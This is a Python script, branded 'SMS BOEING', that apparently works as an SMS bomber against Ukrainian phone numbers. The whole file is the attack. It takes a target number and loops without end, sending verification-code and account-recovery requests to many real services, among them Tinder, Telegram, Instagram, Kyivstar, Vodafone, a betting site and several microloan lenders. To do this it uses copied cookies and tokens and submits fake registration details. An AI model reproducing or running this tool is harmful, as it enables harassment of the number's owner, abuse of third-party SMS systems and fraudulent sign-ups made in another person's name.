import requests
from colorama import *
init(autoreset= True)
version = (Fore.WHITE+"1.3")


print(Fore.RED+'##########################')
print(Fore.YELLOW+'#'+Fore.GREEN+'   SMS BOEING\n'+Fore.GREEN+'#'+Fore.BLUE+'   From @Valtasar_UA')
print(Fore.RED+'##########################')
print(Fore.BLUE+ "Versoin: " + version+'')
print(Fore.BLUE+'Telegram'+Fore.WHITE+" @Green_Hacking")
print(Fore.RED+' __________________________')
print(Fore.RED+'|' +Fore.WHITE+'Введіть номер телефону👇 '+Fore.RED+' /   ')
print(Fore.RED+'|________________________/\n')


num = input(Fore.GREEN+ '+380: '+Fore.WHITE)

while True:
	try:
			re1 = requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=uk", data = {"phone_number":'380'+num},)
			print(Fore.GREEN+'Запит надіслано! ☠️  ',re1,'Tinder')
	except:
		print(Fore.RED+'Помилка!		',re1,'Tinder')
	
	try:
		re2 = requests.get(f'https://shop.kyivstar.ua/api/v2/otp_login/send/380{num}')
		print(Fore.GREEN+'Запит надіслано! ☠️  ',re2,'Kyivstar')
	except:
		print(Fore.RED+'Помилка!		',re2,'Kyivstar')

	try:
		re4 = requests.post("https://rider.uklon.com.ua/api/v1/phone/send-code", json={'username':'+380'+num}, headers={'X-Requested-With':'XMLHttpRequest', 'strict-transport-security': 'max-age=15724800; includeSubDomains', 'x-correlation-id': 'c3208fdf-4dd7-4bca-aa84-2c686c1e2f60', 'sentry-trace': '796731cc91f54825a3e0435bebc67587-a104fb30d8b1adfc-1', 'uklon-agent': 'UklonPwa/1.16.0.182484', 'referer': 'https://m.uklon.com.ua/', 'locale': 'uk', 'client_id': '04F2BB99734848E1A061140A7452D1A9', 'app_uid': '9e33ffae-0ffd-4361-8bed-869b9ec94cb1', 'city': 'kyiv', 'cf-ray': '6a7f973a9ac12319-KBP', 'content-length': '0', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-cache', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
		print(Fore.GREEN+'Запит надіслано! ☠️  '  ,re4,'Uklon')
	except:
		print(Fore.RED+'Помилка!		',re4, 'Uklon')
			
	try:
		re6 = requests.post("https://my.ctrs.com.ua/api/auth/login", data={"provider": "phone", "identity": "380"+num},)
		print(Fore.GREEN+'Запит надіслано! ☠️  ',re6,'???')
	except:
		print(Fore.RED+'Помилка!		',re6, '???')
	
	try:
		re7 = requests.post("https://my.telegram.org/auth/send_password", data={"phone": "+380"+num},)
		print(Fore.GREEN+'Запит надіслано! ☠️  ',re7, 'Telegram')
	except:
		print(Fore.RED+'Помилка!		',re7, 'Telegram')
		
	try:
		re8= requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": "380"+num},)
		print(Fore.GREEN+'Запит надіслано! ☠️  ',re8, 'Vodafone')
	except:
		print(Fore.RED+'Помилка!		',re8,'Vodafone')
		
	try:
		re9 = requests.post("https://zolotakoroleva.ua/api/send-otp", json={"params": {"phone": "+380"+num}},)
		print(Fore.GREEN+'Запит надіслано! ☠️  ',re1, 'ZolKorol')
	except:
		print(Fore.RED+'Помилка!		',re1, 'ZolKorol')

	
#	re10 = requests.post("https://my.xtra.tv/api/signup?lang=uk", data={"phone": a},)
#	print(re10)
	try:
		re11 = requests.post("https://megasport.ua/api/auth/phone/?language=ru", json={"phone": "+380"+num},)
		print(Fore.GREEN+'Запит надіслано! ☠️  ',re11, 'MEGASPORT')
	except:
		print(Fore.RED+'Помилка!		',re11,'MEGASPORT')
		
	try:
		re12 = requests.post('https://admin.topcredit.ua/api/sms/password-verification/create', json={"phone": "380"+num},)
		print(Fore.GREEN+'Запит надіслано! ☠️  ',re12,'TopCredit')
	except:
		print(Fore.RED+'Помилка!		',re12,'TopCredit')
			
	try:
		re13 = requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/", data={'email_or_username': "380"+num}, headers={'accept-encoding':'gzip, deflate, br', 'accept-language':'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7','content-type':'application/x-www-form-urlencoded', 'cookie':'ig_did=06389D42-D5BA-42C2-BCA6-49C2913D682B; csrftoken=SSEx9Bf0HmcQ8uCJVmh66Z4qBhu1F0iL; mid=XyIqeAALAAF1N7j0GbPCNuWhznuX; rur=FRC; urlgen="{\"109.252.48.249\": 25513\054 \"109.252.48.225\": 25513}:1k5JBz:E-7UgfDDLsdtlKvXiWBUphtFMdw"','referer':'https://www.instagram.com/accounts/password/reset/', 'origin':'https://www.instagram.com','user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 OPR/69.0.3686.95 (Edition Yx)','x-csrftoken':'SSEx9Bf0HmcQ8uCJVmh66Z4qBhu1F0iL', 'x-ig-app-id':'936619743392459','x-instagram-ajax': 'a9aec8fa634f', 'x-requested-with': 'XMLHttpRequest'})
		print(Fore.GREEN+'Запит надіслано! ☠️  ',re13, 'Instagram')
	except:
		print(Fore.RED+'Помилка!		',re13,'Instagram')
			
	try:
		re14 = requests.post("https://parimatch.com/api/short-registration/include-login/by-phone", json={"phone":"380"+num, "password":"tkhdg777A","isPlayerAgree":"true","marketingMeta":{"org":"search","org_t":"1666392707579","sourceURL":"https://www.google.com/","registerURL":"https://parimatch.com/en/regtel","iohash":"949bd12c935e626dc6c53f4e7e4a153126014366a635b0b5cd1124f7bed82e72","dhash":"66f9e8bc-23ac-4a90-b8a5-645701b1aa10","isep":"true","entrance_url":"https://parimatch.com/en/regtel","dublicate":"true","win_tag":"search","win_tag_type":"org"},"selectedLanguage":"en","currencyId":"1","skipPhoneOtpConfirmation":"false"},)
		print(Fore.GREEN+'Запит надіслано! ☠️  ',re14, 'PariMatch')
	except:
			print(Fore.RED+'Помилка!		',re14,'PariMatch')
			
	try:
		re15 = requests.post("https://admin1.groshivsim.com/api/sms/phone-verification/create", json={"phone": "380"+num},)
		print(Fore.GREEN+'Запит надіслано! ☠️  ',re15, 'GroshiVsim')
	except:
		print(Fore.RED+'Помилка!		',re15,'GroshiVsim')

	
	try:
		re16 = requests.post("https://money4you.ua/api/clientRegistration/sendValidationSms", json={"fathersName": "Витальевич", "firstName": "Виталий", "lastName": "Соколов", "phone": "+380"+num, "udriveEmployee": "false"},)
		print(Fore.GREEN+'Запит надіслано! ☠️  ',re16,'Money4you')
	except:
		print(Fore.RED+'Помилка!		',re16,'Money4you')
	
	try:
		re17 = requests.post("https://md-fashion.com.ua/bpm/validate-contact" , data = { 'phone' : '+380'+ num },)
		print(Fore.GREEN+'Запит надіслано! ☠️  ',re17,'???')
	except:
		print(Fore.RED+'Помилка!		',re17,'???')
	try:
		re18 = requests.post("https://mozayka.com.ua/!processing/ajax.php", data={"phone":"+380"+num,"mp_m":"sendsmscodereg","token":"9d064a2beeb932ae5de11f74631269b4"},)
		print(Fore.GREEN+'Запит надіслано! ☠️  ',re18,'mozayka')
	except:
		print(Fore.RED+'Помилка!		',re18,'mozayka')
	print(Fore.BLUE+'КОЛО')